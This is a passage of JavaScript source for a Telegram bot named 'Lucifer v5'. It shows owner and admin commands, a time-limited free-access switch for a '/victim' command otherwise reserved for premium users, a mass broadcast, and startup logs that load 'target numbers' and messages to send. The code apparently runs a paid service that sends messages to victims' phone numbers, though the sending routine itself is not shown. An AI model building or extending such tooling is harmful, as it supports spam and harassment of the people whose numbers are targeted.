  if (!args[0]) return ctx.reply("❌ Please provide a Telegram user ID (e.g., /deladmin 123456789)");
  const targetId = String(args[0]);
  if (adminUsers.delete(targetId)) {
    saveData();
    console.log(`[deladmin] Removed ${targetId} from adminUsers`);
    ctx.reply(`✅ Removed ${targetId} from admins.`);
  } else {
    ctx.reply(`❌ ${targetId} is not an admin.`);
  }
});

bot.command("freelimit", requireFollow, restrictAccess, async (ctx) => {
  const userId = String(ctx.from.id);
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("🔒 This command is restricted to owners only!");
  }
  const args = ctx.message.text.split(" ").slice(1);
  if (!args[0] || isNaN(args[0])) return ctx.reply("❌ Please provide a duration in minutes (e.g., /freelimit 60)");
  const minutes = parseInt(args[0]);
  freeAccessUntil = Date.now() + minutes * 60 * 1000;
  console.log(`[freelimit] Set free access until ${moment(freeAccessUntil).format("HH:mm:ss")} for ${minutes} minutes`);
  ctx.reply(`✅ Free access enabled for ${minutes} minutes. Non-premium users can use /victim until ${moment(freeAccessUntil).format("HH:mm:ss")}.`);
});

bot.command("broadcast", requireFollow, restrictAccess, async (ctx) => {
  const userId = String(ctx.from.id);
  if (!OWNER_IDS.includes(userId) && !adminUsers.has(userId)) {
    return ctx.reply("🔒 This command is restricted to owners and admins only!");
  }
  const args = ctx.message.text.split(" ").slice(1);
  if (!args.length) return ctx.reply("❌ Please provide a message (e.g., /broadcast Hello everyone!)");
  const message = args.join(" ");
  let successCount = 0;
  let failCount = 0;

  for (const userId of botUsers) {
    try {
      await bot.telegram.sendMessage(userId, `📢 Broadcast from Lucifer v5:\n${message}`);
      successCount++;
    } catch (error) {
      console.error(`Failed to send broadcast to ${userId}:`, error);
      failCount++;
    }
  }
  ctx.reply(`✅ Broadcast sent!\n• Success: ${successCount} users\n• Failed: ${failCount} users`);
});

bot.command("ping", requireFollow, restrictAccess, async (ctx) => {
  const userId = String(ctx.from.id);
  if (!OWNER_IDS.includes(userId) && !adminUsers.has(userId)) {
    return ctx.reply("🔒 This command is restricted to owners and admins only!");
  }
  const startTime = Date.now();
  const pingMsg = await ctx.reply("🏓 Calculating...");
  const endTime = Date.now();
  const responseTime = endTime - startTime;
  const uptimeMs = endTime - botStartTime;
  const uptime = moment.duration(uptimeMs).humanize();
  await ctx.reply(`🏓 Pong!\n• Response Time: ${responseTime}ms\n• Uptime: ${uptime}`);
  await ctx.deleteMessage(pingMsg.message_id);
});

// Log startup and configuration
console.log("🚀 Lucifer v5 is running...");
console.log('Messages to send:', CUSTOM_MESSAGE1, CUSTOM_MESSAGE2);
console.log('Target numbers loaded:', TARGET_NUMBERS.length);

bot.launch();

// Handle SIGINT/SIGTERM
const botStartTime = Date.now();
process.on('SIGINT', () => {
  bot.stop('SIGINT');
  process.exit(0);
});
process.on('SIGTERM', () => {
  bot.stop('SIGTERM');
  process.exit(0);
});
